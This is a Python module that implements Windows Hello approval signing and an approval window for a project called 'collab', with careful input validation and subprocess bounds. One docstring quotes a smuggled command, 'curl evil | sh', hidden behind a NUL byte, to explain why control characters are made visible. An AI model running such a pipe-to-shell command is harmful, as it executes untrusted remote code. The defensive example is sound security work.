"""Strong approval through Windows Hello, from Windows or from WSL.

An approval collab can trust is a SIGNATURE BY A KEY THAT SIGNS ONLY AFTER A
HUMAN GESTURE — a fingerprint, a face, a PIN — collected by Windows itself. An
agent on this machine can ask for a signature; it cannot complete one. This
module is the Windows half of that: it enrols a TPM-backed key with
`KeyCredentialManager`, signs a challenge with it, and shows collab's own
approval window, the front door a human starts each approval from. The proof is
the gesture: THE HUB verifies every signature against the key enrolled for
this participant before anything acts on it (the hub's verifier is
R22b-core's); `verify` here is the same check, for a local self-test only.

VERIFIED BY EXECUTION, with the user making the gestures (2026-11-14,
.claude/r22b-strong-approval-design.md):

* `RequestCreateAsync` prompts; `RequestSignAsync` prompts on EVERY call — about
  12 s each with a human; `RetrievePublicKey` reads the SPKI without a prompt.
* Signatures are RSA-2048, PKCS#1 v1.5 over SHA-256 of the bytes given — the
  test vector in tests/test_consent_hello.py is the one the user signed.
* `DeleteAsync` needs NO gesture (63 ms). An agent can delete the human's key:
  a denial of service, not a forgery, and the hub treats a key that has gone
  as an alarm, never as a reason to fall back quietly.
* The Hello dialog shows no text of the caller's, which is why collab's own
  window shows the review — and it is not the secure desktop (the screen does
  not dim), so a PIN typed there may be observable by a same-user process.
  A captured PIN still needs this machine's TPM key and a gesture per
  signature; biometrics are preferred, and the docs say so.
* PowerShell 5.1 cannot cast a WinRT `IBuffer`; the scripts use
  `WindowsRuntimeBufferExtensions.ToArray` / `AsBuffer` through reflection.

NOTHING THE CALLER SUPPLIES IS EVER POWERSHELL CODE. The script is a fixed
string, passed with `-EncodedCommand`; the key name, the challenge and the
review travel as one base64 line on stdin — which also sidesteps PowerShell
5.1's console encoding — and the name is checked against `_NAME` first.

EVERY CALL IS A BOUNDED SUBPROCESS, the project's three limits for reading a
peer it does not control: an output cap (`OUTPUT_CAP`), a deadline enforced
while nothing arrives (the reader is a thread; the clock is ours), and its own
process group, ended as a group at the deadline. A human who cancels the Hello
prompt is a `Refused`, never a hang.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from typing import Any

#: Where Windows keeps PowerShell 5.1 when WSL's PATH does not carry it.
_WINDOWS_POWERSHELL = "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"

#: A Hello key name: what `KeyCredentialManager` files the key under. Checked
#: here although it never reaches PowerShell as code, because it is also the
#: `cred_id` the hub records.
_NAME = re.compile(r"[A-Za-z0-9._-]{1,64}\Z")

#: The most a call may print. A public key is ~400 bytes of base64 and a
#: signature ~350; a review is never printed back. 64 KiB is a hundred times
#: what a correct answer needs and bounds what a broken one can cost.
OUTPUT_CAP = 64 * 1024

#: Seconds a call that needs no human may take — PowerShell and WinRT start in
#: about 1–2 s on this machine — and one that waits for a human's gesture.
QUICK = 15.0
HUMAN = 120.0

#: How long the approval window may stay open. Reading a long review is
#: slower than making a gesture, and a window that closed itself mid-read
#: would teach a human to approve quickly. Ten minutes; then the request
#: EXPIRES — never «declined», which would be a decision nobody made.
WINDOW_DEADLINE = 600.0

#: The largest review the window is handed. The canonical review is built by
#: the hub; this is the bound on what reaches the dialog however it was built.
REVIEW_MAX = 64 * 1024


class HelloError(Exception):
    """Windows Hello answered with a status collab cannot act on."""

    def __init__(self, status: str) -> None:
        super().__init__(f"Windows Hello: {status}")
        self.status = status


class Refused(HelloError):
    """The human cancelled the prompt, or chose a password. A refusal."""


class NotEnrolled(HelloError):
    """There is no Hello key of that name on this machine."""


class AlreadyEnrolled(HelloError):
    """A Hello key of that name exists already; enrolment does not replace one."""


class Unavailable(HelloError):
    """No Windows Hello here: no powershell.exe, no TPM, or the device locked."""


#: KeyCredentialStatus → the outcome it means. Anything else is a HelloError
#: carrying the status — the word, never more than the word.
_OUTCOMES = {
    "UserCanceled": Refused,
    "UserPrefersPassword": Refused,
    "NotFound": NotEnrolled,
    "CredentialAlreadyExists": AlreadyEnrolled,
    "SecurityDeviceLocked": Unavailable,
}


_SCRIPT = r"""
$ErrorActionPreference = 'Stop'
function Say($o) { [Console]::Out.WriteLine(($o | ConvertTo-Json -Compress)) }
try {
  $line = [Console]::In.ReadLine()
  $req = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line)) | ConvertFrom-Json
  if ($req.op -eq 'window') {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $f = New-Object Windows.Forms.Form
    $f.Text = 'collab - approval requested'
    $f.TopMost = $true
    $f.StartPosition = 'CenterScreen'
    $f.Size = New-Object Drawing.Size(760, 600)
    $f.MinimizeBox = $false
    $id = New-Object Windows.Forms.Label
    $id.Text = $req.requester
    $id.AutoEllipsis = $true
    $id.Font = New-Object Drawing.Font('Segoe UI', 11, [Drawing.FontStyle]::Bold)
    $id.SetBounds(12, 8, 720, 24)
    $name = New-Object Windows.Forms.Label
    $name.Text = $req.name
    $name.AutoEllipsis = $true
    $name.SetBounds(12, 34, 720, 20)
    $what = New-Object Windows.Forms.Label
    $what.Text = $req.summary
    $what.AutoEllipsis = $true
    $what.SetBounds(12, 58, 720, 20)
    $box = New-Object Windows.Forms.TextBox
    $box.Multiline = $true
    $box.ReadOnly = $true
    $box.ScrollBars = 'Vertical'
    $box.WordWrap = $true
    $box.Font = New-Object Drawing.Font('Consolas', 10)
    $box.Text = $req.review
    $box.SetBounds(12, 84, 720, 410)
    $box.MaxLength = 0
    $script:choice = 'decline'
    $ok = New-Object Windows.Forms.Button
    $ok.Text = 'Approve with Windows Hello'
    $ok.SetBounds(12, 505, 230, 36)
    $ok.Add_Click({ $script:choice = 'approve'; $f.Close() })
    $no = New-Object Windows.Forms.Button
    $no.Text = 'Decline'
    $no.SetBounds(252, 505, 140, 36)
    $no.Add_Click({ $script:choice = 'decline'; $f.Close() })
    $pk = New-Object Windows.Forms.Button
    $pk.Text = 'Use a passkey instead'
    $pk.SetBounds(522, 505, 210, 36)
    $pk.Add_Click({ $script:choice = 'passkey'; $f.Close() })
    $f.Controls.AddRange(@($id, $name, $what, $box, $ok, $no, $pk))
    $f.CancelButton = $no
    $f.AcceptButton = $no
    $f.Add_Shown({ $f.Activate(); $no.Focus() })
    if ($req.dry) { $f.Dispose(); Say @{status = 'Success'; choice = 'built'}; exit 0 }
    [void]$f.ShowDialog()
    Say @{status = 'Success'; choice = $script:choice}
    exit 0
  }
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  [void][Windows.Security.Credentials.KeyCredentialManager,Windows.Security.Credentials,ContentType=WindowsRuntime]
  [void][Windows.Storage.Streams.IBuffer,Windows.Storage.Streams,ContentType=WindowsRuntime]
  $asTask = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' } | Select-Object -First 1
  function Await($op, [Type]$t) {
    $task = $asTask.MakeGenericMethod($t).Invoke($null, @($op))
    $task.Wait(-1) | Out-Null
    $task.Result
  }
  $ext = [System.Runtime.InteropServices.WindowsRuntime.WindowsRuntimeBufferExtensions]
  $toArray = $ext.GetMethod('ToArray', [Type[]]@([Windows.Storage.Streams.IBuffer]))
  $asBuffer = $ext.GetMethod('AsBuffer', [Type[]]@([byte[]]))
  $KCM = [Windows.Security.Credentials.KeyCredentialManager]
  $Retrieval = [Windows.Security.Credentials.KeyCredentialRetrievalResult]
  $Spki = [Windows.Security.Cryptography.Core.CryptographicPublicKeyBlobType]::X509SubjectPublicKeyInfo
  function PublicKey($cred) {
    [Convert]::ToBase64String($toArray.Invoke($null, @($cred.RetrievePublicKey($Spki))))
  }
  switch ($req.op) {
    'supported' {
      Say @{status = 'Success'; supported = [bool](Await ($KCM::IsSupportedAsync()) ([bool]))}
    }
    'create' {
      $r = Await ($KCM::RequestCreateAsync($req.name,
            [Windows.Security.Credentials.KeyCredentialCreationOption]::FailIfExists)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else { Say @{status = 'Success'; spki = (PublicKey $r.Credential)} }
    }
    'pubkey' {
      $r = Await ($KCM::OpenAsync($req.name)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else { Say @{status = 'Success'; spki = (PublicKey $r.Credential)} }
    }
    'sign' {
      $r = Await ($KCM::OpenAsync($req.name)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else {
        $msg = [Convert]::FromBase64String($req.challenge)
        $s = Await ($r.Credential.RequestSignAsync($asBuffer.Invoke($null, @(,$msg)))) `
              ([Windows.Security.Credentials.KeyCredentialOperationResult])
        if ($s.Status -ne 'Success') { Say @{status = "$($s.Status)"} }
        else { Say @{status = 'Success'; signature = [Convert]::ToBase64String($toArray.Invoke($null, @($s.Result)))} }
      }
    }
    default { Say @{status = 'BadRequest'} }
  }
} catch {
  # The exception's TYPE only: its message can carry text nobody vetted.
  Say @{status = 'Error'; error = $_.Exception.GetType().Name}
}
"""


def _powershell() -> str | None:
    """Windows PowerShell 5.1: on PATH on Windows, at a fixed place under WSL."""
    found = shutil.which("powershell.exe")
    if found:
        return found
    return _WINDOWS_POWERSHELL if os.path.exists(_WINDOWS_POWERSHELL) else None


def _command(exe: str) -> list[str]:
    encoded = base64.b64encode(_SCRIPT.encode("utf-16-le")).decode("ascii")
    return [exe, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", encoded]


def _run(request: dict, deadline: float) -> dict:
    """One call to the script: a JSON request in, one JSON answer out.

    Bounded three ways (see the module docstring). Raises `Unavailable` when
    there is no PowerShell, `HelloError("Timeout")` at the deadline — the
    process group is ended first — and `HelloError("BadAnswer")` for anything
    that is not one JSON object.
    """
    # THE CLOCK STARTS HERE, before the process exists and before anything is
    # written to it. Started after a blocking stdin write, a child that never
    # read its stdin held the caller for as long as the pipe stayed full —
    # measured at 30 s against a 2 s deadline.
    end = time.monotonic() + deadline
    exe = _powershell()
    if exe is None:
        raise Unavailable("NoPowerShell")
    line = base64.b64encode(json.dumps(request).encode("utf-8")) + b"\n"
    group = ({"start_new_session": True} if os.name == "posix"
             else {"creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)})
    try:
        proc = subprocess.Popen(_command(exe), stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, **group)
    except OSError as exc:
        raise Unavailable(type(exc).__name__) from None
    got = bytearray()
    over = threading.Event()

    def read() -> None:
        assert proc.stdout is not None
        while True:
            chunk = proc.stdout.read1(4096) if hasattr(proc.stdout, "read1") \
                else proc.stdout.read(4096)
            if not chunk:
                return
            if len(got) + len(chunk) > OUTPUT_CAP:
                over.set()
                return
            got.extend(chunk)

    def write() -> None:
        try:
            assert proc.stdin is not None
            proc.stdin.write(line)
            proc.stdin.close()
        except (OSError, ValueError):
            pass

    reader = threading.Thread(target=read, daemon=True, name="collab-hello-read")
    writer = threading.Thread(target=write, daemon=True, name="collab-hello-write")
    reader.start()
    writer.start()
    try:
        while reader.is_alive() and not over.is_set() and time.monotonic() < end:
            reader.join(0.05)
        if reader.is_alive() or over.is_set():
            _end_group(proc)
            reader.join(1.0)
            raise HelloError("OutputTooLarge" if over.is_set() else "Timeout")
        try:
            proc.wait(max(0.1, end - time.monotonic()))
        except subprocess.TimeoutExpired:
            _end_group(proc)
        return _answer(bytes(got))
    finally:
        for pipe in (proc.stdout, proc.stdin):
            try:
                if pipe is not None:
                    pipe.close()
            except (OSError, ValueError):
                pass


def _end_group(proc: subprocess.Popen) -> None:
    """End the call's own process tree — powershell.exe and anything it
    started — then reap. Only this process's own tree, never a name match.

    POSIX (WSL): the process group the call was started in. Native Windows
    has no process groups to signal and no `os.killpg`: `taskkill /T /F` on
    the call's own pid ends its tree. Anything that fails here is caught —
    an exception on the kill path would leave the process running AND lose
    the timeout it was ending."""
    try:
        if os.name == "posix":
            os.killpg(proc.pid, signal.SIGKILL)
        else:
            subprocess.run(["taskkill", "/T", "/F", "/PID", str(proc.pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=5, check=False)
    except Exception:                                         # noqa: BLE001
        try:
            proc.kill()
        except Exception:                                     # noqa: BLE001
            pass
    try:
        proc.wait(2)
    except Exception:                                         # noqa: BLE001
        pass


def _answer(raw: bytes) -> dict:
    """The one JSON object the script printed, from PowerShell's output.

    The LAST line that parses: PowerShell can put a BOM or a banner ahead of
    it, and CRLF after it."""
    text = raw.decode("utf-8", "replace").lstrip("﻿")
    for candidate in reversed([ln.strip() for ln in text.splitlines() if ln.strip()]):
        try:
            value = json.loads(candidate)
        except ValueError:
            continue
        if isinstance(value, dict) and isinstance(value.get("status"), str):
            return value
    raise HelloError("BadAnswer")


def _checked(answer: dict) -> dict:
    status = answer["status"]
    if status == "Success":
        return answer
    raise _OUTCOMES.get(status, HelloError)(status[:40])


def _name(name: str) -> str:
    if not isinstance(name, str) or not _NAME.match(name):
        raise ValueError("a Hello key name is 1–64 of A–Z a–z 0–9 . _ -")
    return name


def _b64(value: Any, what: str) -> bytes:
    if not isinstance(value, str):
        raise HelloError(f"BadAnswer:{what}")
    try:
        return base64.b64decode(value, validate=True)
    except ValueError:
        raise HelloError(f"BadAnswer:{what}") from None


# --- the four operations ------------------------------------------------------------

def available() -> bool:
    """Is Windows Hello usable here? Never prompts; never raises."""
    try:
        return _checked(_run({"op": "supported"}, QUICK)).get("supported") is True
    except Exception:                                         # noqa: BLE001
        return False


def enrol(name: str) -> dict:
    """Create a gesture-bound key named `name` — the human is prompted — and
    return what the hub registers. Raises `AlreadyEnrolled` rather than
    replacing a key, `Refused` on a cancel."""
    answer = _checked(_run({"op": "create", "name": _name(name)}, HUMAN))
    spki = _b64(answer.get("spki"), "spki")
    return {"cred_id": name, "method": "hello", "alg": "RS256",
            "spki_der_b64": base64.b64encode(spki).decode("ascii"),
            "created": time.time()}


def public_key(name: str) -> bytes:
    """The enrolled key's SubjectPublicKeyInfo, DER. Does not prompt."""
    answer = _checked(_run({"op": "pubkey", "name": _name(name)}, QUICK))
    return _b64(answer.get("spki"), "spki")


def sign(name: str, challenge: bytes) -> bytes:
    """Sign `challenge` with the key `name` — the human is prompted, every
    time. RSA PKCS#1 v1.5 over SHA-256 of `challenge`. `Refused` on a cancel."""
    if not isinstance(challenge, (bytes, bytearray)) or not 1 <= len(challenge) <= 4096:
        raise ValueError("a challenge is 1–4096 bytes")
    answer = _checked(_run({"op": "sign", "name": _name(name),
                            "challenge": base64.b64encode(bytes(challenge)).decode("ascii")},
                           HUMAN))
    return _b64(answer.get("signature"), "signature")


def verify(spki_der: bytes, message: bytes, signature: bytes) -> bool:
    """Does `signature` sign `message` under this RSA key, PKCS#1 v1.5 /
    SHA-256 — as Hello signs? The hub's check, for a local self-test."""
    from cryptography.exceptions import InvalidSignature
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa

    try:
        key = serialization.load_der_public_key(spki_der)
    except ValueError:
        return False
    if not isinstance(key, rsa.RSAPublicKey):
        return False
    try:
        key.verify(signature, message, padding.PKCS1v15(), hashes.SHA256())
        return True
    except InvalidSignature:
        return False


# --- the approval window ------------------------------------------------------------

def _visible(text: Any, *, lines: bool) -> str:
    """Text a remote party chose, made to show what it IS.

    Every control and format character becomes a visible `\\u{XXXX}`: C0/C1
    controls, NUL among them — WinForms stops drawing a TextBox at a NUL, so
    «make test\\0; curl evil | sh» showed only «make test» — the bidi
    overrides and isolates (U+202A–202E, U+2066–2069) that reorder what is
    drawn, zero-width characters, the BOM, line and paragraph separators, and
    unpaired surrogates. `lines` keeps tab, CR and LF, for the review box.
    """
    import unicodedata

    out = []
    for c in "" if text is None else str(text):
        if lines and c in "\t\r\n":
            out.append(c)
        elif unicodedata.category(c) in ("Cc", "Cf", "Cs", "Co", "Cn", "Zl", "Zp"):
            out.append(f"\\u{{{ord(c):04X}}}")
        else:
            out.append(c)
    return "".join(out)


def _line(value: Any, limit: int) -> str:
    """One line of a remote party's text: visible, single-line, bounded."""
    text = _visible(value, lines=False)
    return (text[:limit] + "…") if len(text) > limit else (text or "?")


def fields(request: dict) -> dict:
    """What the window's three lines say.

    THE HUB-ASSIGNED ID FIRST, on its own line: a requester's NAME is its own
    choice, and one chosen to read «alice (p_alice) asks for approval ⸻…»
    pushed the real id off a wrapped label. The name comes second, marked as
    self-chosen; the third line is subject, destination, authority and the
    digest's first 16 hex.
    """
    return {
        "requester": f"Requester: {_line(request.get('requester_id'), 64)}"
                     "  — participant id, assigned by the hub",
        "name": f"Calls itself: {_line(request.get('requester_name'), 64)}  (self-chosen)",
        "summary": (f"{_line(request.get('subject'), 60)} → "
                    f"{_line(request.get('destination'), 60)}"
                    f" · grants {_line(request.get('authority'), 60)}"
                    f" · digest {_line(request.get('digest_hex'), 16)}"),
    }


def open_window(request: dict) -> dict:
    """Show collab's approval window for `request`, and act on the choice.

    `request` is the dispatcher's (`consent.window.open`): request_id,
    requester_id, requester_name, subject, destination, authority, digest_hex,
    review_text, challenge_b64, cred_id. Returns one of:

        {"choice": "approve", "method": "hello", "cred_id", "signature_b64"}
        {"choice": "decline"}
        {"choice": "passkey"}           — the dispatcher opens the passkey page
        {"choice": "expired"}           — nobody chose within WINDOW_DEADLINE
        {"choice": "unavailable", "reason"}

    Approve is the human's click AND the Hello gesture: the signature is made
    only after both, a cancelled gesture is a decline, and the HUB verifies the
    signature against the key enrolled for this participant before anything
    acts on it. The window shows the review as untrusted text; the Hello dialog
    that follows shows none. Nothing of the review is logged.
    """
    # VALIDATED BEFORE THE WINDOW: a request that could not be signed must not
    # ask a human to read and approve it first.
    cred = request.get("cred_id")
    try:
        _name(cred)
        challenge = base64.b64decode(str(request.get("challenge_b64") or ""), validate=True)
        if not 1 <= len(challenge) <= 4096:
            raise ValueError("challenge size")
    except (ValueError, TypeError):
        return {"choice": "unavailable", "reason": "BadRequest"}
    review = _visible(request.get("review_text"), lines=True)
    if len(review) > REVIEW_MAX:
        review = review[:REVIEW_MAX] + "\n… [the review is longer than the window shows]"
    review = ("UNTRUSTED — this is what the requester sent, shown as text:\n\n"
              + review.replace("\r\n", "\n").replace("\n", "\r\n"))
    try:
        answer = _run({"op": "window", **fields(request), "review": review},
                      WINDOW_DEADLINE)
        choice = _checked(answer).get("choice")
    except Unavailable as exc:
        return {"choice": "unavailable", "reason": exc.status}
    except HelloError as exc:
        if exc.status == "Timeout":
            return {"choice": "expired"}
        # The window could not be shown — WinForms failed, PowerShell broke:
        # nothing was decided, so nothing is declined.
        return {"choice": "unavailable", "reason": exc.status}
    if choice == "passkey":
        return {"choice": "passkey"}
    if choice != "approve":
        return {"choice": "decline"}
    try:
        signature = sign(cred, challenge)
    except Refused:
        return {"choice": "decline", "reason": "Refused"}
    except NotEnrolled:
        return {"choice": "unavailable", "reason": "NotEnrolled"}
    except HelloError as exc:
        if exc.status == "Timeout":
            return {"choice": "expired"}
        return {"choice": "unavailable", "reason": exc.status}
    return {"choice": "approve", "method": "hello", "cred_id": cred,
            "signature_b64": base64.b64encode(signature).decode("ascii")}


def build_window_only(request: dict) -> dict:
    """Build the window with this request's text and dispose of it unshown —
    a real check of the WinForms code that raises nothing on the screen."""
    return _checked(_run({"op": "window", "dry": True, **fields(request),
                          "review": _visible(request.get("review_text"), lines=True)},
                         QUICK))


__all__ = ["AlreadyEnrolled", "HelloError", "NotEnrolled", "Refused", "Unavailable",
           "available", "build_window_only", "enrol", "fields", "open_window",
           "public_key", "sign", "verify"]


def _self_check(name: str = "collab-selftest") -> None:      # pragma: no cover
    """By hand only: enrol (prompts), sign (prompts), verify."""
    record = enrol(name)
    spki = base64.b64decode(record["spki_der_b64"])
    message = b"collab hello self-check"
    print(verify(spki, message, sign(name, message)))

